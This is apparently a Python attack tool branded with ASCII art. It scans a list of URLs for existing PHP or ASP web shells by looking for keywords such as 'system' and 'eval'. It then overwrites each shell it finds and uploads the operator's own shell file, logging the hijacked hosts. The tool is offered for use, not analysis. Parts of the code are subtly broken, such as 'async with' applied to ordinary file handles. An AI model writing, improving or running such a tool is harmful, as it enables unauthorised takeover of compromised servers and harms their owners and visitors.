import os
import sys
import asyncio
import aiohttp

# Define RGB color
purple = "\033[38;2;111;0;255m"
reset = "\033[0m"

# Print ASCII art in RGB purple color
print(purple + """…………………▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
……………▄▄█▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓█▄▄
…………▄▀▀▓▒░░░░░░░░░░░░░░░░▒▓▓▀▄
………▄▀▓▒▒░░░░░░░░░░░░░░░░░░░▒▒▓▀▄
……..█▓█▒░░░░░░░░░░░░░░░░░░░░░▒▓▒▓█      ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░                                 
…..▌▓▀▒░░░░░░░░░░░░░░░░░░░░░░░░▒▀▓█    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░ 
…..█▌▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░ 
…▐█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█▌    ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░ 
…█▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█          ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░   
..█▐▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒█▓█        ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░                   
…█▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▌▓█  ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░  
..█▓▓█▒░░░░▒█▄▒▒░░░░░░░░░▒▒▄█▒░░░░▒█▓▓█                                                                               
..█▓█▒░▒▒▒▒░░▀▀█▄▄░░░░░▄▄█▀▀░░▒▒▒▒░▒█▓█ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░
.█▓▌▒▒▓▓▓▓▄▄▄▒▒▒▀█░░░░█▀▒▒156;▄▄▄▓▓▓▓▒▒▐▓ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
.██▌▒▓███▓█████▓▒▐▌░░▐▌▒▓████▓████▓▒▐██░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
..██▒▒▓███▓▓▓████▓▄░░░▄▓████▓▓▓███▓▒▒██░▒▓█▓▒░      ░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░ 
..█▓▒▒▓██████████▓▒░░░▒▓██████████▓▒▒▓█░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
..█▓▒░▒▓███████▓▓▄▀░░▀▄▓▓███████▓▒░▒▓█ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
….█▓▒░▒▒▓▓▓▓▄▄▄▀▒░░░░░▒▀▄▄▄▓▓▓▓▒▒░▓█    ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░
……█▓▒░▒▒▒▒░░░░░░▒▒▒▒░░░░░░▒▒▒▒░▒▓█
………█▓▓▒▒▒░░██░░▒▓██▓▒░░██░░▒▒▒▓▓█
………▀██▓▓▓▒░░▀░▒▓████▓▒░▀░░▒▓▓▓██▀      
………….░▀█▓▒▒░░░▓█▓▒▒▓█▓▒░░▒▒▓█▀░
…………█░░██▓▓▒░░▒▒▒░▒▒▒░░▒▓▓██░░█
………….█▄░░▀█▓▒░░░░░░░░░░▒▓█▀░░▄█
…………..█▓█░░█▓▒▒▒░░░░░▒▒▒▓█░░█▓█
…………….█▓█░░█▀█▓▓▓▓▓▓█▀░░█░█▓█▌
……………..█▓▓█░█░█░█▀▀▀█░█░▄▀░█▓█
……………..█▓▓█░░▀█▀█░█░█▄█▀░░█▓▓█
………………█▓▒▓█░░░░▀▀▀▀░░░░░█▓▓█
………………█▓▒▒▓█░░░░ ░░░░░░░█▓▓█
………………..█▓▒▓██▄█░░░▄░░▄██▓▒▓█
………………..█▓▒▒▓█▒█▀█▄█▀█▒█▓▒▓█
………………..█▓▓▒▒▓██▒▒██▒██▓▒▒▓█
………………….█▓▓▒▒▓▀▀███▀▀▒▒▓▓█
……………………▀█▓▓▓▓▒▒▒▒▓▓▓▓█▀
………………………..▀▀██▓▓▓▓██▀
""" + reset)

webshell_extensions = ['.php', '.asp', '.file']
webshell_keywords = ['system', 'upload', 'eval']

async def check_webshell(session, url, shell_file_path, output_file, uploaded_file):
    try:
        async with session.get(url, timeout=10) as response:
            if response.status == 200:
                file_contents = await response.text()
                if any(keyword in file_contents.lower() for keyword in webshell_keywords):
                    print(f"\033[1;32mFound: {url}\033[0m")
                    async with output_file:
                        await output_file.write(url + '\n')
                    
                    # Attempt to remove old shell by overwriting with empty content
                    try:
                        async with session.post(url, data='', timeout=10) as remove_response:
                            if remove_response.status == 200:
                                print(f"\033[1;33mRemoved old shell: {url}\033[0m")
                            else:
                                print(f"\033[1;31mFailed to remove old shell: {url}\033[0m")
                                return
                    except Exception as e:
                        print(f"\033[1;31mError removing old shell {url}: {e}\033[0m")
                        return

                    # Upload new shell
                    try:
                        with open(shell_file_path, 'rb') as f:
                            shell_content = f.read()
                        # Simulate file upload using multipart form data
                        data = aiohttp.FormData()
                        data.add_field('file', shell_content, filename=os.path.basename(shell_file_path))
                        async with session.post(url, data=data, timeout=10) as upload_response:
                            if upload_response.status == 200:
                                print(f"\033[1;32mSuccessfully uploaded new shell to: {url}\033[0m")
                                async with uploaded_file:
                                    await uploaded_file.write(url + '\n')
                            else:
                                print(f"\033[1;31mFailed to upload new shell to: {url}\033[0m")
                    except Exception as e:
                        print(f"\033[1;31mError uploading new shell to {url}: {e}\033[0m")
                else:
                    print(f"\033[1;31mDead: {url}\033[0m")
            else:
                print(f"\033[1;31mDead: {url}\033[0m")
    except Exception as e:
        print(f"\033[1;31mDead: {url} ({str(e)})\033[0m")

async def detect_webshell_from_urls(file_path, shell_file_path):
    try:
        # Read URLs from file
        with open(file_path, 'r') as url_file:
            urls = [url.strip() for url in url_file.readlines() if url.strip()]
        
        # Initialize aiohttp session
        async with aiohttp.ClientSession() as session:
            # Open output files in async context
            output_file = open('foundshells.txt', 'a')
            uploaded_file = open('uploadedshells.txt', 'a')
            
            tasks = []
            for url in urls:
                if os.path.splitext(url)[1].lower() in webshell_extensions:
                    tasks.append(check_webshell(session, url, shell_file_path, output_file, uploaded_file))
            
            # Run all tasks concurrently
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Close files
            output_file.close()
            uploaded_file.close()
            
    except KeyboardInterrupt:
        print("\nExecution stopped by user. Results saved.")
    except FileNotFoundError:
        print(f"\033[1;31mError: Input file {file_path} not found\033[0m")
    except Exception as e:
        print(f"\033[1;31mAn unexpected error occurred: {e}\033[0m")

def main():
    if len(sys.argv) != 3:
        print("\033[1;31mUsage: python shell_scanner.py <input_file> <shell_file_path>\033[0m")
        sys.exit(1)
    
    input_file = sys.argv[1]
    shell_file_path = sys.argv[2]
    
    if not os.path.isfile(input_file):
        print(f"\033[1;31mError: Input file {input_file} not found\033[0m")
        sys.exit(1)
    
    if not os.path.isfile(shell_file_path):
        print(f"\033[1;31mError: Shell file {shell_file_path} not found\033[0m")
        sys.exit(1)
    
    asyncio.run(detect_webshell_from_urls(input_file, shell_file_path))

if __name__ == "__main__":
    main()